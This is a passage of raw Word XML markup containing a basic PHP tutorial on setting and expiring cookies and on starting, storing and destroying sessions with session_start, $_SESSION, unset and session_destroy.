          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="7D2727"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="7D2727"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>codingslover</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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303336"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>$</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="303336"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>cookie_uvalue</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="303336"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="7D2727"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>"website"</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858C93"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>//set cookies for 1 hour time</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spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="303336"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>setcookie</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="303336"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="303336"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>$</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="303336"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>cookie_uname</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="303336"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>, $</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="303336"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>cookie_uvalue</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="303336"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="7D2727"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>3600</w:t>
      </w:r>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="303336"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>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858C93"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>//expire cookies</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spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="303336"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>setcookie</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="303336"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="303336"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>$cookie_uname,</w:t>
      </w:r>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w:t>
      </w:r>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="7D2727"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>3600</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5C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="303336"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>?&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B44BD0" w:rsidRDefault="00B44BD0" w:rsidP="005C42C7">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rPr>
      </w:pP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t>Sessions</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005C42C7" w:rsidRPr="005C42C7" w:rsidRDefault="005C42C7" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="91"/>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Sessions are stored in server side.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005C42C7" w:rsidRPr="005C42C7" w:rsidRDefault="005C42C7" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="91"/>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It is stored unlimited amount of data.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005C42C7" w:rsidRPr="005C42C7" w:rsidRDefault="005C42C7" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="91"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="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It is holding the multiple </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>variable</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> in sessions.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="005C42C7">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rPr>
      </w:pP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t xml:space="preserve">Destroy </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Sessions :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="005C42C7" w:rsidRPr="005C42C7" w:rsidRDefault="005C42C7" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="92"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="12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Using </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>unset(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>) session, we will destroyed the sessions.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005C42C7" w:rsidRPr="005C42C7" w:rsidRDefault="005C42C7" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="92"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="450"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve">Using </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>session_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>destory</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve">), we </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>we</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> will destroyed the sessions.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005C42C7" w:rsidRPr="005C42C7" w:rsidRDefault="005C42C7" w:rsidP="005C42C7">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Example:</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gramStart"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="303336"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>&lt;?</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="303336"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>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spellStart"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="303336"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>session_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="303336"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>start</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="303336"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>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858C93"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>//session variable</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303336"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>$_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="303336"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>SESSION[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="7D2727"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>'</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="7D2727"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>testvaraible</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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 xml:space="preserve">] = </w:t>
      </w:r>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="7D2727"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>'</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="7D2727"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>Codings</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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858C93"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>//destroyed the entire sessions</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spellStart"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="303336"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>session_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="303336"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>destroy</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="303336"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="303336"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t xml:space="preserve">); </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5C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="858C93"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>//Destroyed the session variable "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="858C93"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>testvaraible</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="858C93"/>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roofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="303336"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>unset(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="303336"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>$_SESSION[</w:t>
      </w:r>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="7D2727"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>'</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
